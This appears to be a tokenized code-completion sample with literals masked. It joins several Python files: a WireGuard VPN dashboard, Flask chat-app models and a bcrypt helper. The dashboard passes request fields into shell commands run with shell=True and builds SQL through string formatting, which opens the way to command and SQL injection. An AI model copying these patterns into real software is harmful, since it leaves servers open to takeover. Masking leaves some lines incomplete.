"<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> for i in illegal_filename : <EOL> name = name . replace ( i , "<STR_LIT>" ) <EOL> try : <EOL> newFile = open ( f"<STR_LIT>" , "<STR_LIT>" ) <EOL> newFile . write ( "<STR_LIT>" . join ( output ) ) <EOL> except Exception as e : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : str ( e ) } <EOL> return { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : name } <EOL> def deleteConfiguration ( self , data , config , g , WG_CONF_PATH ) : <EOL> confs = [ ] <EOL> for i in config : <EOL> confs . append ( i [ '<STR_LIT>' ] ) <EOL> print ( confs ) <EOL> if data [ '<STR_LIT>' ] not in confs : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } <EOL> for i in config : <EOL> if i [ '<STR_LIT>' ] == data [ '<STR_LIT>' ] : <EOL> if i [ '<STR_LIT>' ] == "<STR_LIT>" : <EOL> try : <EOL> subprocess . check_output ( "<STR_LIT>" + data [ '<STR_LIT>' ] , shell = True , stderr = subprocess . STDOUT ) <EOL> except subprocess . CalledProcessError as exc : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str ( exc . output . strip ( ) . decode ( "<STR_LIT>" ) ) } <EOL> g . cur . execute ( f'<STR_LIT>' ) <EOL> g . cur . execute ( f'<STR_LIT>' ) <EOL> g . db . commit ( ) <EOL> try : <EOL> os . remove ( f'<STR_LIT>' ) <EOL> except Exception as e : <EOL> return { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str ( e ) } <EOL> return good <EOL> class settings : <EOL> def setTheme ( self , theme , config , setConfig ) : <EOL> themes = [ '<STR_LIT>' , '<STR_LIT>' ] <EOL> if theme not in themes : <EOL> return ret ( status = False , reason = "<STR_LIT>" ) <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = theme <EOL> setConfig ( config ) <EOL> return ret ( ) <EOL> </s>
<s> from . bp import cli_bp <EOL> from app . models . base import db <EOL> @ cli_bp . cli . command ( '<STR_LIT>' ) <EOL> def create_db ( ) -> None : <EOL> db . create_all ( ) <EOL> print ( '<STR_LIT>' ) <EOL> @ cli_bp . cli . command ( '<STR_LIT>' ) <EOL> def drop_db ( ) -> None : <EOL> db . drop_all ( ) <EOL> print ( '<STR_LIT>' ) <EOL> </s>
<s> from flask import Blueprint <EOL> main = Blueprint ( '<STR_LIT>' , __name__ ) <EOL> </s>
<s> from typing import Optional <EOL> from flask_login import UserMixin <EOL> from itsdangerous import URLSafeTimedSerializer as Serializer , SignatureExpired , BadSignature <EOL> from os import environ <EOL> from . base import db <EOL> DEFAULT_PROFILE_PICTURE = '<STR_LIT>' <EOL> class User ( db . Model , UserMixin ) : <EOL> __tablename__ = '<STR_LIT>' <EOL> id = db . Column ( db . Integer , primary_key = True ) <EOL> username = db . Column ( db . String ( <NUM_LIT> ) , unique = True , nullable = False ) <EOL> email = db . Column ( db . String , unique = True , nullable = False ) <EOL> password = db . Column ( db . String ( <NUM_LIT> ) , nullable = False ) <EOL> profile_picture = db . Column ( db . String ( <NUM_LIT> ) , nullable = False , default = DEFAULT_PROFILE_PICTURE ) <EOL> messages = db . relationship ( '<STR_LIT>' , backref = '<STR_LIT>' , lazy = True ) <EOL> allowed_channels = db . relationship ( '<STR_LIT>' , backref = '<STR_LIT>' , lazy = True ) <EOL> def __repr__ ( self ) -> str : <EOL> return f"<STR_LIT>" <EOL> def generate_api_token ( self , expiration : int = <NUM_LIT> ) -> str : <EOL> s = Serializer ( environ [ '<STR_LIT>' ] , expires_in = expiration , salt = '<STR_LIT>' ) <EOL> return s . dumps ( { '<STR_LIT>' : self . id } ) . decode ( '<STR_LIT>' ) <EOL> @ staticmethod <EOL> def verify_api_token ( token : str ) -> Optional [ '<STR_LIT>' ] : <EOL> s = Serializer ( environ [ '<STR_LIT>' ] , salt = '<STR_LIT>' ) <EOL> try : <EOL> data = s . loads ( token ) <EOL> except SignatureExpired : <EOL> return None <EOL> except BadSignature : <EOL> return None <EOL> user = User . query . get ( data [ '<STR_LIT>' ] ) <EOL> return user <EOL> </s>
<s> from . base import bcrypt <EOL> def hash_password ( password : str ) -> str : <EOL> hashed_password : str = bcrypt . generate_password_hash ( password ) . decode ( '<STR_LIT>' ) <EOL> return hashed_password <EOL> def check_hashed_password ( hashed_password : str , password : str ) -> bool : <EOL> matching : bool = bcrypt . check_password_hash ( hashed_password , password ) <EOL> return matching <EOL> </s>
<s> from flask import Flask <EOL> from flask_socketio import SocketIO , join_room , leave_room <EOL> from . config import configure_app <EOL> from . import models , main , login , api , bcrypt , login_manager , cli , schemas <EOL> from app . sockets import add_message <EOL> import app . cli . commands <EOL> from . models import Channel , Message , db <EOL> def create_app ( ) -> Flask : <EOL> app = Flask ( __name__ ) <EOL> configure_app ( app ) <EOL> models . init_app ( app ) <EOL> schemas . init_app ( app ) <EOL> main . init_app ( app ) <EOL> login . init_app ( app ) <EOL> api . init_app ( app ) <EOL> bcrypt . init_app ( app ) <EOL> login_manager . init_app ( app ) <EOL> cli . init_app ( app ) <EOL> return app <EOL> app = create_app ( ) <EOL> socket_io = SocketIO ( app ) <EOL> @ socket_io . on ( '<STR_LIT>' ) <EOL> def join_r ( data : dict ) -> None : <EOL> room = data [ '<STR_LIT>' ] <EOL> join_room ( room ) <EOL> @ socket_io . on ( '<STR_LIT>' ) <EOL> def leave_r ( data : dict ) -> None : <EOL> room = data [ '<STR_LIT>' ] <EOL> leave_room ( room ) <EOL> @ socket_io . on ( '<STR_LIT>' ) <EOL> def add_message_socket ( data : dict ) -> None : <EOL> add_message ( data ) <EOL> </s>
<s> import sqlite3 <EOL> import configparser <EOL> import bcrypt <EOL> import ipaddress <EOL> import json <EOL> import os <EOL> import secrets <EOL> import string <EOL> import subprocess <EOL> import time <EOL> import re <EOL> import urllib . parse <EOL> import urllib . request <EOL> import urllib . error <EOL> from datetime import datetime , timedelta <EOL> from operator import itemgetter <EOL> import ifcfg <EOL> from flask import Flask , request , render_template , redirect , url_for , session , jsonify , g <EOL> from flask_qrcode import QRcode <EOL> from icmplib import ping , traceroute <EOL> from util import * <EOL> DASHBOARD_VERSION = '<STR_LIT>' <EOL> WG_CONF_PATH = None <EOL> configuration_path = os . getenv ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> DB_PATH = os . path . join ( configuration_path , '<STR_LIT>' ) <EOL> if not os . path . isdir ( DB_PATH ) : <EOL> os . mkdir ( DB_PATH ) <EOL> DASHBOARD_CONF = os . path . join ( configuration_path , '<STR_LIT>' , '<STR_LIT>' ) <EOL> UPDATE = None <EOL> app = Flask ( "<STR_LIT>" ) <EOL> app . config [ '<STR_LIT>' ] = <NUM_LIT> <EOL> characters = string . ascii_letters + string . digits + string . punctuation <EOL> wg_dash_appkey = '<STR_LIT>' . join ( secrets . choice ( characters ) for _ in range ( <NUM_LIT> ) ) <EOL> app . secret_key = wg_dash_appkey <EOL> app . config [ '<STR_LIT>' ] = True <EOL> QRcode ( app ) <EOL> def get_dashboard_conf ( ) : <EOL> r_config = configparser . ConfigParser ( strict = False ) <EOL> r_config . read ( DASHBOARD_CONF ) <EOL> return r_config <EOL> def set_dashboard_conf ( config ) : <EOL> with open ( DASHBOARD_CONF , "<STR_LIT>" , encoding = '<STR_LIT>' ) as conf_object : <EOL> config . write ( conf_object ) <EOL> def init_dashboard ( ) : <EOL> if not os . path . isfile ( DASHBOARD_CONF ) : <EOL> open ( DASHBOARD_CONF , "<STR_LIT>" ) . close ( ) <EOL> config = get_dashboard_conf ( ) <EOL> if "<STR_LIT>" not in config : <EOL> config [ '<STR_LIT>' ] = { } <EOL> if "<STR_LIT>" not in config [ '<STR_LIT>' ] : <EOL> wg_dash_user = os . environ . get ( '<STR_LIT>' ) <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = wg_dash_user <EOL> if "<STR_LIT>" not in config [ '<STR_LIT>' ] : <EOL> wg_dash_pass = os . environ . get ( '<STR_LIT>' ) <EOL> salt = bcrypt . gensalt ( rounds = <NUM_LIT> ) <EOL> hashed_password_bytes = bcrypt . hashpw ( wg_dash_pass . encode ( '<STR_LIT>' ) , salt ) <EOL> hashed_password_str = hashed_password_bytes . decode ( '<STR_LIT>' ) . lstrip ( '<STR_LIT>' ) <EOL> hashpassword_output = f"<STR_LIT>" <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = hashpassword_output <EOL> if "<STR_LIT>" not in config : <EOL> config [ '<STR_LIT>' ] = { } <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] or config [ '<STR_LIT>' ] [ '<STR_LIT>' ] != DASHBOARD_VERSION : <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = DASHBOARD_VERSION <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> if "<STR_LIT>" not in config : <EOL> config [ '<STR_LIT>' ] = { } <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> wg_dash_global_dns = os . environ . get ( '<STR_LIT>' ) <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = wg_dash_global_dns <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> peer_endpoint_allowed_ip = os . environ . get ( '<STR_LIT>' ) <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = peer_endpoint_allowed_ip <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> server_ip = os . environ . get ( '<STR_LIT>' ) <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = server_ip <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> wg_dash_mtu = os . environ . get ( '<STR_LIT>' ) <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = wg_dash_mtu <EOL> if '<STR_LIT>' not in config [ '<STR_LIT>' ] : <EOL> wg_dash_keep_alive = os . environ . get ( '<STR_LIT>' ) <EOL> config [ '<STR_LIT>' ] [ '<STR_LIT>' ] = wg_dash_keep_alive <EOL> set_dashboard_conf ( config ) <EOL> config . clear ( ) <EOL> def run_dashboard ( ) : <EOL> config = configparser . ConfigParser ( strict = False ) <EOL> config . read ( '<STR_LIT>' ) <EOL> app_ip = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> app_port = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> global WG_CONF_PATH <EOL> WG_CONF_PATH = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> config . clear ( ) <EOL> return app <EOL> init_dashboard ( ) <EOL> run_dashboard ( ) <EOL> def connect_db ( ) : <EOL> return sqlite3 . connect ( os . path . join ( configuration_path , '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> def get_conf_peer_key ( config_name ) : <EOL> try : <EOL> peers_keys = subprocess . check_output ( f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> peers_keys = peers_keys . decode ( "<STR_LIT>" ) . split ( ) <EOL> return peers_keys <EOL> except subprocess . CalledProcessError : <EOL> return config_name + "<STR_LIT>" <EOL> def get_conf_running_peer_number ( config_name ) : <EOL> running = <NUM_LIT> <EOL> try : <EOL> data_usage = subprocess . check_output ( f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> except subprocess . CalledProcessError : <EOL> return <NUM_LIT> <EOL> data_usage = data_usage . decode ( "<STR_LIT>" ) . split ( ) <EOL> count = <NUM_LIT> <EOL> now = datetime . now ( ) <EOL> time_delta = timedelta ( minutes = <NUM_LIT> ) <EOL> for _ in range ( int ( len ( data_usage ) / <NUM_LIT> ) ) : <EOL> minus = now - datetime . fromtimestamp ( int ( data_usage [ count + <NUM_LIT> ] ) ) <EOL> if minus < time_delta : <EOL> running += <NUM_LIT> <EOL> count += <NUM_LIT> <EOL> return running <EOL> def read_conf_file_interface ( config_name ) : <EOL> conf_location = WG_CONF_PATH + "<STR_LIT>" + config_name + "<STR_LIT>" <EOL> try : <EOL> with open ( conf_location , '<STR_LIT>' , encoding = '<STR_LIT>' ) as file_object : <EOL> file = file_object . read ( ) . split ( "<STR_LIT>" ) <EOL> data = { } <EOL> for i in file : <EOL> if not regex_match ( "<STR_LIT>" , i ) : <EOL> if len ( i ) > <NUM_LIT> : <EOL> if i != "<STR_LIT>" : <EOL> tmp = re . split ( r'<STR_LIT>' , i , <NUM_LIT> ) <EOL> if len ( tmp ) == <NUM_LIT> : <EOL> data [ tmp [ <NUM_LIT> ] ] = tmp [ <NUM_LIT> ] <EOL> except FileNotFoundError as e : <EOL> return { } <EOL> return data <EOL> def read_conf_file ( config_name ) : <EOL> conf_location = WG_CONF_PATH + "<STR_LIT>" + config_name + "<STR_LIT>" <EOL> f = open ( conf_location , '<STR_LIT>' ) <EOL> file = f . read ( ) . split ( "<STR_LIT>" ) <EOL> conf_peer_data = { <EOL> "<STR_LIT>" : { } , <EOL> "<STR_LIT>" : [ ] <EOL> } <EOL> peers_start = <NUM_LIT> <EOL> for i in range ( len ( file ) ) : <EOL> if not regex_match ( "<STR_LIT>" , file [ i ] ) and regex_match ( "<STR_LIT>" , file [ i ] ) : <EOL> if file [ i ] == "<STR_LIT>" : <EOL> peers_start = i <EOL> break <EOL> else : <EOL> if len ( file [ i ] ) > <NUM_LIT> : <EOL> if file [ i ] != "<STR_LIT>" : <EOL> tmp = re . split ( r'<STR_LIT>' , file [ i ] , <NUM_LIT> ) <EOL> if len ( tmp ) == <NUM_LIT> : <EOL> conf_peer_data [ '<STR_LIT>' ] [ tmp [ <NUM_LIT> ] ] = tmp [ <NUM_LIT> ] <EOL> conf_peers = file [ peers_start : ] <EOL> peer = - <NUM_LIT> <EOL> for i in conf_peers : <EOL> if not regex_match ( "<STR_LIT>" , i ) and not regex_match ( "<STR_LIT>" , i ) : <EOL> if i == "<STR_LIT>" : <EOL> peer += <NUM_LIT> <EOL> conf_peer_data [ "<STR_LIT>" ] . append ( { } ) <EOL> elif peer > - <NUM_LIT> : <EOL> if len ( i ) > <NUM_LIT> : <EOL> tmp = re . split ( r'<STR_LIT>' , i , <NUM_LIT> ) <EOL> if len ( tmp ) == <NUM_LIT> : <EOL> conf_peer_data [ "<STR_LIT>" ] [ peer ] [ tmp [ <NUM_LIT> ] ] = tmp [ <NUM_LIT> ] <EOL> f . close ( ) <EOL> return conf_peer_data <EOL> def get_latest_handshake ( config_name ) : <EOL> try : <EOL> data_usage = subprocess . check_output ( f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> except subprocess . CalledProcessError : <EOL> return "<STR_LIT>" <EOL> data_usage = data_usage . decode ( "<STR_LIT>" ) . split ( ) <EOL> count = <NUM_LIT> <EOL> now = datetime . now ( ) <EOL> time_delta = timedelta ( minutes = <NUM_LIT> ) <EOL> for _ in range ( int ( len ( data_usage ) / <NUM_LIT> ) ) : <EOL> minus = now - datetime . fromtimestamp ( int ( data_usage [ count + <NUM_LIT> ] ) ) <EOL> if minus < time_delta : <EOL> status = "<STR_LIT>" <EOL> else : <EOL> status = "<STR_LIT>" <EOL> if int ( data_usage [ count + <NUM_LIT> ] ) > <NUM_LIT> : <EOL> g . cur . execute ( "<STR_LIT>" <EOL> % ( config_name , str ( minus ) . split ( "<STR_LIT>" , maxsplit = <NUM_LIT> ) [ <NUM_LIT> ] , status , data_usage [ count ] ) ) <EOL> else : <EOL> g . cur . execute ( "<STR_LIT>" <EOL> % ( config_name , status , data_usage [ count ] ) ) <EOL> count += <NUM_LIT> <EOL> def get_transfer ( config_name ) : <EOL> try : <EOL> data_usage = subprocess . check_output ( f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> except subprocess . CalledProcessError : <EOL> return "<STR_LIT>" <EOL> data_usage = data_usage . decode ( "<STR_LIT>" ) . split ( "<STR_LIT>" ) <EOL> final = [ ] <EOL> for i in data_usage : <EOL> final . append ( i . split ( "<STR_LIT>" ) ) <EOL> data_usage = final <EOL> for i in range ( len ( data_usage ) ) : <EOL> cur_i = g . cur . execute ( <EOL> "<STR_LIT>" <EOL> % ( config_name , data_usage [ i ] [ <NUM_LIT> ] ) ) . fetchall ( ) <EOL> if len ( cur_i ) > <NUM_LIT> : <EOL> total_sent = cur_i [ <NUM_LIT> ] [ <NUM_LIT> ] <EOL> total_receive = cur_i [ <NUM_LIT> ] [ <NUM_LIT> ] <EOL> cur_total_sent = round ( int ( data_usage [ i ] [ <NUM_LIT> ] ) / ( <NUM_LIT> ** <NUM_LIT> ) , <NUM_LIT> ) <EOL> cur_total_receive = round ( int ( data_usage [ i ] [ <NUM_LIT> ] ) / ( <NUM_LIT> ** <NUM_LIT> ) , <NUM_LIT> ) <EOL> if cur_i [ <NUM_LIT> ] [ <NUM_LIT> ] == "<STR_LIT>" : <EOL> if total_sent <= cur_total_sent and total_receive <= cur_total_receive : <EOL> total_sent = cur_total_sent <EOL> total_receive = cur_total_receive <EOL> else : <EOL> cumulative_receive = cur_i [ <NUM_LIT> ] [ <NUM_LIT> ] + total_receive <EOL> cumulative_sent = cur_i [ <NUM_LIT> ] [ <NUM_LIT> ] + total_sent <EOL> g . cur . execute ( "<STR_LIT>" % <EOL> ( config_name , round ( cumulative_receive , <NUM_LIT> ) , round ( cumulative_sent , <NUM_LIT> ) , <EOL> round ( cumulative_sent + cumulative_receive , <NUM_LIT> ) , data_usage [ i ] [ <NUM_LIT> ] ) ) <EOL> total_sent = <NUM_LIT> <EOL> total_receive = <NUM_LIT> <EOL> g . cur . execute ( "<STR_LIT>" % <EOL> ( config_name , round ( total_receive , <NUM_LIT> ) , round ( total_sent , <NUM_LIT> ) , <EOL> round ( total_receive + total_sent , <NUM_LIT> ) , data_usage [ i ] [ <NUM_LIT> ] ) ) <EOL> def get_endpoint ( config_name ) : <EOL> try : <EOL> data_usage = subprocess . check_output ( f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> except subprocess . CalledProcessError : <EOL> return "<STR_LIT>" <EOL> data_usage = data_usage . decode ( "<STR_LIT>" ) . split ( ) <EOL> count = <NUM_LIT> <EOL> for _ in range ( int ( len ( data_usage ) / <NUM_LIT> ) ) : <EOL> g . cur . execute ( "<STR_LIT>" + config_name + "<STR_LIT>" <EOL> % ( data_usage [ count + <NUM_LIT> ] , data_usage [ count ] ) ) <EOL> count += <NUM_LIT> <EOL> def get_allowed_ip ( conf_peer_data , config_name ) : <EOL> for i in conf_peer_data [ "<STR_LIT>" ] : <EOL> g . cur . execute ( "<STR_LIT>" + config_name + "<STR_LIT>" <EOL> % ( i . get ( '<STR_LIT>' , '<STR_LIT>' ) , i [ "<STR_LIT>" ] ) ) <EOL> def get_all_peers_data ( config_name ) : <EOL> conf_peer_data = read_conf_file ( config_name ) <EOL> config = get_dashboard_conf ( ) <EOL> failed_index = [ ] <EOL> for i in range ( len ( conf_peer_data [ '<STR_LIT>' ] ) ) : <EOL> if "<STR_LIT>" in conf_peer_data [ '<STR_LIT>' ] [ i ] . keys ( ) : <EOL> result = g . cur . execute ( <EOL> "<STR_LIT>" % ( config_name , conf_peer_data [ '<STR_LIT>' ] [ i ] [ "<STR_LIT>" ] ) ) . fetchall ( ) <EOL> if len ( result ) == <NUM_LIT> : <EOL> new_data = { <EOL> "<STR_LIT>" : conf_peer_data [ '<STR_LIT>' ] [ i ] [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> "<STR_LIT>" : config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : [ ] , <EOL> "<STR_LIT>" : config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> "<STR_LIT>" : config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> "<STR_LIT>" : config . get ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> if "<STR_LIT>" in conf_peer_data [ '<STR_LIT>' ] [ i ] . keys ( ) : <EOL> new_data [ "<STR_LIT>" ] = conf_peer_data [ '<STR_LIT>' ] [ i ] [ "<STR_LIT>" ] <EOL> sql = <EOL> g . cur . execute ( sql , new_data ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> failed_index . append ( i ) <EOL> for i in failed_index : <EOL> conf_peer_data [ '<STR_LIT>' ] . pop ( i ) <EOL> db_key = list ( map ( lambda a : a [ <NUM_LIT> ] , g . cur . execute ( "<STR_LIT>" % config_name ) ) ) <EOL> wg_key = list ( map ( lambda a : a [ '<STR_LIT>' ] , conf_peer_data [ '<STR_LIT>' ] ) ) <EOL> for i in db_key : <EOL> if i not in wg_key : <EOL> g . cur . execute ( "<STR_LIT>" % ( config_name , i ) ) <EOL> get_latest_handshake ( config_name ) <EOL> get_transfer ( config_name ) <EOL> get_endpoint ( config_name ) <EOL> get_allowed_ip ( conf_peer_data , config_name ) <EOL> def getLockAccessPeers ( config_name ) : <EOL> col = g . cur . execute ( f"<STR_LIT>" ) . fetchall ( ) <EOL> col = [ a [ <NUM_LIT> ] for a in col ] <EOL> data = g . cur . execute ( f"<STR_LIT>" ) . fetchall ( ) <EOL> result = [ { col [ i ] : data [ k ] [ i ] for i in range ( len ( col ) ) } for k in range ( len ( data ) ) ] <EOL> return result <EOL> def get_peers ( config_name , search , sort_t ) : <EOL> tic = time . perf_counter ( ) <EOL> col = g . cur . execute ( "<STR_LIT>" + config_name + "<STR_LIT>" ) . fetchall ( ) <EOL> col = [ a [ <NUM_LIT> ] for a in col ] <EOL> get_all_peers_data ( config_name ) <EOL> if len ( search ) == <NUM_LIT> : <EOL> data = g . cur . execute ( "<STR_LIT>" + config_name ) . fetchall ( ) <EOL> result = [ { col [ i ] : data [ k ] [ i ] for i in range ( len ( col ) ) } for k in range ( len ( data ) ) ] <EOL> else : <EOL> sql = "<STR_LIT>" + config_name + "<STR_LIT>" + search + "<STR_LIT>" <EOL> data = g . cur . execute ( sql ) . fetchall ( ) <EOL> result = [ { col [ i ] : data [ k ] [ i ] for i in range ( len ( col ) ) } for k in range ( len ( data ) ) ] <EOL> if sort_t == "<STR_LIT>" : <EOL> result = sorted ( result , key = lambda d : ipaddress . ip_network ( <EOL> "<STR_LIT>" if d [ sort_t ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] == "<STR_LIT>" else d [ sort_t ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] ) ) <EOL> else : <EOL> result = sorted ( result , key = lambda d : d [ sort_t ] ) <EOL> toc = time . perf_counter ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> return result <EOL> def get_conf_pub_key ( config_name ) : <EOL> try : <EOL> conf = configparser . ConfigParser ( strict = False ) <EOL> conf . read ( WG_CONF_PATH + "<STR_LIT>" + config_name + "<STR_LIT>" ) <EOL> pri = conf . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> pub = subprocess . check_output ( f"<STR_LIT>" , shell = True , stderr = subprocess . STDOUT ) <EOL> conf . clear ( ) <EOL> return pub . decode ( ) . strip ( "<STR_LIT>" ) <EOL> except configparser . NoSectionError : <EOL> return "<STR_LIT>" <EOL> def get_conf_listen_port ( config_name ) : <EOL> conf = configparser . ConfigParser ( strict = False ) <EOL> conf . read ( WG_CONF_PATH + "<STR_LIT>" + config_name + "<STR_LIT>" ) <EOL> port = "<STR_LIT>" <EOL> try : <EOL> port = conf . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> except ( configparser . NoSectionError , configparser . NoOptionError ) : <EOL> if get_conf_status ( config_name ) == "<STR_LIT>" : <EOL> port = subprocess . check_output ( f"<STR_LIT>" , <EOL> shell = True , stderr = subprocess . STDOUT ) <EOL> port = port . decode ( "<STR_LIT>" ) <EOL> conf . clear ( ) <EOL> return port <EOL> def get_conf_total_data ( config_name ) : <EOL> data = g . cur . execute ( "<STR_LIT>" + config_name ) <EOL> upload_total = <NUM_LIT> <EOL> download_total = <NUM_LIT> <EOL> for i in data . fetchall ( ) : <EOL> upload_total += i [ <NUM_LIT> ] <EOL> download_total += i [ <NUM_LIT> ] <EOL> upload_total += i [ <NUM_LIT> ] <EOL> download_total += i [ <NUM_LIT> ] <EOL> total = round ( upload_total + download_total , <NUM_LIT> ) <EOL> upload_total = round ( upload_total , <NUM_LIT> ) <EOL> download_total = round ( download_total , <NUM_LIT> ) <EOL> return [ total , upload_total , download_total ] <EOL> def get_conf_status ( config_name ) : <EOL> ifconfig = dict ( ifcfg . interfaces ( ) . items ( ) ) <EOL> return "<STR_LIT>" if config_name in ifconfig . keys ( ) else "<STR_LIT>" <EOL> def get_conf_list ( ) : <EOL> conf = [ ] <EOL> for i in os . listdir ( WG_CONF_PATH ) : <EOL> if regex_match ( "<STR_LIT>" , i ) : <EOL> i = i . replace ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> create_table = <EOL> g . cur . execute ( create_table ) <EOL> create_table = <EOL> g . cur . execute ( create_table ) <EOL> temp = { "<STR_LIT>" : i , "<STR_LIT>" : get_conf_status ( i ) , "<STR_LIT>" : get_conf_pub_key ( i ) , "<STR_LIT>" : get_conf_listen_port ( i ) } <EOL> if temp [ '<STR_LIT>' ] == "<STR_LIT>" : <EOL> temp [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> else : <EOL> temp [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> conf . append ( temp ) <EOL> if len ( conf ) > <NUM_LIT> : <EOL> conf = sorted ( conf , key = itemgetter ( '<STR_LIT>' ) ) <EOL> return conf <EOL> def gen_public_key ( private_key ) : <EOL> with open ( '<STR_LIT>' , '<STR_LIT>' , encoding = '<STR_LIT>' ) as file_object : <EOL> file_object . write ( private_key ) <EOL> try : <EOL> subprocess . check_output ( "<STR_LIT>" , shell = True ) <EOL> with open ( '<STR_LIT>' , encoding = '<STR_LIT>' ) as file_object : <EOL> public_key = file_object . readline ( ) . strip ( ) <EOL> os . remove ( '<STR_LIT>' ) <EOL> os . remove ( '<STR_LIT>' ) <EOL> return { "<STR_LIT>" : '<STR_LIT>' , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : public_key } <EOL> except subprocess . CalledProcessError : <EOL> os . remove ( '<STR_LIT>' ) <EOL> return { "<STR_LIT>" : '<STR_LIT>' , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } <EOL> def f_check_key_match ( private_key , public_key , config_name ) : <EOL> result = gen_public_key ( private_key ) <EOL> if result [ '<STR_LIT>' ] == '<STR_LIT>' : <EOL> return result <EOL> else : <EOL> sql = "<STR_LIT>" + config_name + "<STR_LIT>" <EOL> match = g . cur . execute ( sql , ( result [ '<STR_LIT>' ] , ) ) . fetchall ( ) <EOL> if len ( match ) != <NUM_LIT> or result [ '<STR_LIT>' ] != public_key : <EOL> return { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } <EOL> else : <EOL> return { '<STR_LIT>' : '<STR_LIT>' } <EOL> def check_repeat_allowed_ip ( public_key , ip , config_name ) : <EOL> peer = g . cur . execute ( "<STR_LIT>" + config_name + "<STR_LIT>" , ( public_key , ) ) . fetchone ( ) <EOL> if peer [ <NUM_LIT> ] != <NUM_LIT> : <EOL> return { '<STR_LIT>' : '<STR_LIT>' , '<STR_LIT>' : '<STR_LIT>' } <EOL> else : <EOL> existed_ip = g . cur . execute ( "<STR_LIT>" + 